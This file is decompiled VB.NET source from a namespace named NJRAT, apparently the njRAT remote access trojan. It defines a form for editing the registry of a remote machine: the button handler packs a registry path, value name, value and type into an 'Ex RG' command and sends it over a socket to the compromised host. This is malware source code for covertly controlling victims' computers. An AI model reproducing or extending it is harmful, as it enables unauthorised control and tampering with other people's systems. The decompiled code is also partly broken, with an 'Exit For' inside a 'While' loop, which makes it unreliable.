Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32

Namespace NJRAT
	' Token: 0x0200001F RID: 31
	<DesignerGenerated()>
	Public Partial Class RGv
		Inherits Form

		' Token: 0x0600042A RID: 1066 RVA: 0x00003340 File Offset: 0x00001540
		<DebuggerNonUserCode()>
		Public Sub New()
			RGv.__ENCAddToList(Me)
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600042B RID: 1067 RVA: 0x00023050 File Offset: 0x00021250
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = RGv.__ENCList
			SyncLock _ENCList
				If RGv.__ENCList.Count = RGv.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = RGv.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = RGv.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								RGv.__ENCList(num) = RGv.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					RGv.__ENCList.RemoveRange(num, RGv.__ENCList.Count - num)
					RGv.__ENCList.Capacity = RGv.__ENCList.Count
				End If
				RGv.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000179 RID: 377
		' (get) Token: 0x0600042E RID: 1070 RVA: 0x00023710 File Offset: 0x00021910
		' (set) Token: 0x0600042F RID: 1071 RVA: 0x00003354 File Offset: 0x00001554
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x1700017A RID: 378
		' (get) Token: 0x06000430 RID: 1072 RVA: 0x00023728 File Offset: 0x00021928
		' (set) Token: 0x06000431 RID: 1073 RVA: 0x0000335D File Offset: 0x0000155D
		Friend Overridable Property Label2 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label2 = value
			End Set
		End Property

		' Token: 0x1700017B RID: 379
		' (get) Token: 0x06000432 RID: 1074 RVA: 0x00023740 File Offset: 0x00021940
		' (set) Token: 0x06000433 RID: 1075 RVA: 0x00003366 File Offset: 0x00001566
		Friend Overridable Property Label3 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label3 = value
			End Set
		End Property

		' Token: 0x1700017C RID: 380
		' (get) Token: 0x06000434 RID: 1076 RVA: 0x00023758 File Offset: 0x00021958
		' (set) Token: 0x06000435 RID: 1077 RVA: 0x0000336F File Offset: 0x0000156F
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x1700017D RID: 381
		' (get) Token: 0x06000436 RID: 1078 RVA: 0x00023770 File Offset: 0x00021970
		' (set) Token: 0x06000437 RID: 1079 RVA: 0x00003378 File Offset: 0x00001578
		Friend Overridable Property TextBox3 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox3 = value
			End Set
		End Property

		' Token: 0x1700017E RID: 382
		' (get) Token: 0x06000438 RID: 1080 RVA: 0x00023788 File Offset: 0x00021988
		' (set) Token: 0x06000439 RID: 1081 RVA: 0x000237A0 File Offset: 0x000219A0
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700017F RID: 383
		' (get) Token: 0x0600043A RID: 1082 RVA: 0x000237F8 File Offset: 0x000219F8
		' (set) Token: 0x0600043B RID: 1083 RVA: 0x00003381 File Offset: 0x00001581
		Friend Overridable Property ComboBox1 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox1 = value
			End Set
		End Property

		' Token: 0x0600043C RID: 1084 RVA: 0x00023810 File Offset: 0x00021A10
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "!", Class7.string_1, Me.Path, Class7.string_1, Me.TextBox1.Text, Class7.string_1, Me.TextBox3.Text, Class7.string_1, Conversions.ToString(Me.Typ(Me.ComboBox1.Text)) }))
			Me.Close()
		End Sub

		' Token: 0x0600043D RID: 1085 RVA: 0x000238C8 File Offset: 0x00021AC8
		Public Function Typ(t As String) As Integer
			Dim left As String = t.ToLower()
			Dim result As Integer
			If Operators.CompareString(left, RegistryValueKind.Binary.ToString().ToLower(), False) = 0 Then
				result = 3
			ElseIf Operators.CompareString(left, RegistryValueKind.DWord.ToString().ToLower(), False) = 0 Then
				result = 4
			ElseIf Operators.CompareString(left, RegistryValueKind.ExpandString.ToString().ToLower(), False) = 0 Then
				result = 2
			ElseIf Operators.CompareString(left, RegistryValueKind.MultiString.ToString().ToLower(), False) = 0 Then
				result = 7
			ElseIf Operators.CompareString(left, RegistryValueKind.QWord.ToString().ToLower(), False) = 0 Then
				result = 11
			ElseIf Operators.CompareString(left, RegistryValueKind.[String].ToString().ToLower(), False) = 0 Then
				result = 1
			Else
				Dim num As Integer
				result = num
			End If
			Return result
		End Function

		' Token: 0x040001F1 RID: 497
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040001F3 RID: 499
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x040001F4 RID: 500
		<AccessedThroughProperty("Label2")>
		Private _Label2 As Label

		' Token: 0x040001F5 RID: 501
		<AccessedThroughProperty("Label3")>
		Private _Label3 As Label

		' Token: 0x040001F6 RID: 502
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x040001F7 RID: 503
		<AccessedThroughProperty("TextBox3")>
		Private _TextBox3 As TextBox

		' Token: 0x040001F8 RID: 504
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x040001F9 RID: 505
		<AccessedThroughProperty("ComboBox1")>
		Private _ComboBox1 As ComboBox

		' Token: 0x040001FA RID: 506
		Public Path As String

		' Token: 0x040001FB RID: 507
		Public sk As Client
	End Class
End Namespace
